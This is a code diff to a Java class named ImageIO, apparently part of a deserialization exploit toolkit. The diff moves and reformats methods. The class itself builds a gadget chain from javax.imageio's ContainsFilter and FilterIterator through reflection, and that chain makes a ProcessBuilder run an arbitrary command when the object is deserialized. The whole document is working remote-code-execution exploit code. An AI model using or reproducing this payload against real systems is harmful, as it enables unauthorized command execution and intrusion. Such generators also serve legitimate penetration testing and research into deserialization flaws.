@@ -7,14 +7,8 @@ import java.lang.reflect.InvocationTargetException;
 import java.lang.reflect.Method;
 import java.util.Collections;
 
-public class ImageIO implements  ObjectPayload<Object>{
-    @Override
-    public Object getObject(String command) throws Exception {
-        UtilFactory uf = new UtilFactory();
-        String args[] = {command};
-        return makeImageIO(uf, args);
-    }
-    public static Object makeImageIO ( UtilFactory uf, String[] args ) throws Exception {
+public class ImageIO implements ObjectPayload<Object> {
+    public static Object makeImageIO(UtilFactory uf, String[] args) throws Exception {
         ProcessBuilder pb = new ProcessBuilder(args);
         Class<?> cfCl = Class.forName("javax.imageio.ImageIO$ContainsFilter");
         Constructor<?> cfCons = cfCl.getDeclaredConstructor(Method.class, String.class);
@@ -29,7 +23,8 @@ public class ImageIO implements  ObjectPayload<Object>{
 
         return uf.makeIteratorTrigger(filterIt);
     }
-    public static Object makeFilterIterator ( Object backingIt, Object first, Object filter )
+
+    public static Object makeFilterIterator(Object backingIt, Object first, Object filter)
             throws NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException, Exception {
         Class<?> fiCl = Class.forName("javax.imageio.spi.FilterIterator");
         Object filterIt = Reflections.createWithoutConstructor(fiCl);
@@ -37,5 +32,12 @@ public class ImageIO implements  ObjectPayload<Object>{
         Reflections.setFieldValue(filterIt, "next", first);
         Reflections.setFieldValue(filterIt, "filter", filter);
         return filterIt;
+    }
+
+    @Override
+    public Object getObject(String command) throws Exception {
+        UtilFactory uf = new UtilFactory();
+        String args[] = {command};
+        return makeImageIO(uf, args);
     }
 }
